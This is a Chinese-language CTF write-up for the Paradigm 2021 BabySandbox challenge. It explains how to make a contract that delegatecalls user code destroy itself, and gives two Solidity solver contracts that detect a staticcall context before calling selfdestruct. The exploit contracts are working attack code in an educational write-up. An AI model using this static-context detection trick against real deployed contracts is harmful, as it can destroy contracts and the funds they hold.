---
layout: post
title:  "Paradigm 2021 BabySandbox题解"
date:   2021-07-19 11:07:32 +0800
categories: paradigm
---

### 题目逻辑
1. ```eq(caller(), address())```在自己重入自己的时候会执行
2. 首先拿calldata，staticcall自己
3. 其次拿calldata，call自己
4. 目的是destruct合约

### 解题
1. 逻辑里2、3步都会delegatecall，相当于把代码复制到自己这里执行
2. 找准区别，第二步不干坏事，第三步再操作
3. 一开始想用memory存储，因为两次调用都是delegatecall，有一个坑点是memory不能操作特别大，比如mload(0x233333)直接就error了，改成0x2333能跑了，但是执行失败，第一次对memory进行的状态修改没有保留到第二次
4. solidity 6.0引入了```try catch```机制
```solidity
contract Solver {
    Solver private immutable self = this;
    
    function check() external { selfdestruct(tx.origin); }
    
    fallback() external payable {
        try self.check() {
            selfdestruct(tx.origin);
        }catch {
            
        }
    }
}
```
此处注意，```Solver private immutable self = this;```会将self作为常量，不能使用this，因为delegatecall的this是babysandbox，同样的，也不能使用store[xxx]，因为指向的内容都是babysandbox的内容，*可选的*，可以使用其他固定的外部Dummy，这样在编译之前就能保存常量到字节码中，*可选的2*，可以将check函数逻辑改为```assembly { sstore(0, 0x555) }```等修改状态从而不满足```staticcall```的语句，但要注意这类调用需要给够gas，估算的结果未必能过

```immutable```修饰的变量是在部署的时候确定变量的值, 它在构造函数中赋值一次之后,就不在改变, 这是一个运行时赋值, 就可以解除之前```constant```不支持使用运行时状态赋值的限制.

```immutable```不可变量同样不会占用状态变量存储空间, 在部署时,变量的值会被追加的运行时字节码中, 因此它比使用状态变量便宜的多, 同样带来了更多的安全性(确保了这个值无法在修改).


5. 解法2，由于```STATICCALL```的子CALL也无法进行状态修改，所以可以捕获

```solidity
pragma solidity 0.7.0;

contract Receiver {
  fallback() external {
    assembly {
      // hardcode the Destroyer's address here before deploying Receiver
      switch call(gas(), 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512(DUMMY), 0x00, 0x00, 0x00, 0x00, 0x00)
        case 0 {
          return(0x00, 0x00)
        }
        case 1 {
          selfdestruct(0)
        }
    }
  }
}

contract Dummy {
  fallback() external {
    selfdestruct(address(0));
  }
}
```